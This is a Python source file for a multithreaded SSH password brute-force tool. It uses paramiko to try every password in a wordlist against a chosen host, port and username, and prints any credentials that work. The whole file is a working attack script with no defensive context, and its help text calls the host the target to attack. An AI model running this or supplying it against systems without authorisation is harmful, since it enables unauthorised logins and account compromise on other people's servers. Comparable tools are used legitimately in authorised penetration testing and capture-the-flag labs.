# ----------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------
# -------------------------------- The mutlithreading way--------------------------------
# ---------------------------------------------------------------------------------------

# Paramiko is a ssh-2 implementation for SSHv2 protocol,this provides all the client and server side functionalities !

import paramiko
import argparse
from datetime import datetime

# termcolor can be used to make text in terminal colorful!
from termcolor import colored

# imported to check if workslist location does exist or not !
from os import path

# for multi threading
from threading import Lock, Thread
from queue import Queue

# for exiting the program
from sys import exit

#  Creating command-line arguments


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Host to attack on e.g. 10.10.10.10.')
    parser.add_argument('-p', '--port', dest='port', default=22,
                        type=int, required=False, help="Port to attack on, Default:22")
    parser.add_argument('-w', '--wordlist', dest='wordlist',
                        required=True, type=str)
    parser.add_argument('-u', '--username', dest='username',
                        required=True, help="Username with which bruteforce to ")
    parser.add_argument('-t', '--threads', dest='threads', required=False, default=4,
                        type=int, help="Specify the thread to use ,Default:4,supports 8 threads ")

    arguments = parser.parse_args()

    return arguments

# Main Function to bruteforce


def ssh_bruteforce(host, port, username, password):
    global lock

 # creating a sshclient object with paramiko !
    ssh = paramiko.SSHClient()
# Configuring to auto add any missing policy if found
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # trying to  connect
        ssh.connect(host, port=port, username=username,
                    password=password, banner_timeout=800)
    except:
        with lock:
            print(
                f"[Attempt] target:- {host} - login:{username} - password:{password}")
    else:
        with lock:
            print(colored(
                f"[{port}] [ssh] host:{host}  login:{username}  password:{password}", 'green'))
            exit(1)
    finally:
        # After all the work closing the connection
        ssh.close()


def con_threads(host, port, username):
    global q
    while True:
        password = q.get()
        result = ssh_bruteforce(host, port, username, password)
        q.task_done()


def main(host, port, username, wordlist, threads):

    global q

    passwords = []

    with open(wordlist, 'r') as f:

        for password in f.readlines():

            password = password.strip()

            passwords.append(password)

    for thread in range(threads):

        thread = Thread(target=con_threads, args=(host, port, username))

        thread.daemon = True

        thread.start()

    for worker in passwords:
        q.put(worker)

    q.join()


if __name__ == "__main__":

    arguments = get_args()

    q = Queue()
    lock = Lock()

    if not path.exists(arguments.wordlist):
        print(colored("[-] Wordlist doesn't exist", 'red'))
        exit(1)

    print(colored(
        f"\n\nSSH-Bruteforce starting on {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n", 'yellow'))
    main(arguments.target, arguments.port, arguments.username,
         arguments.wordlist, arguments.threads)
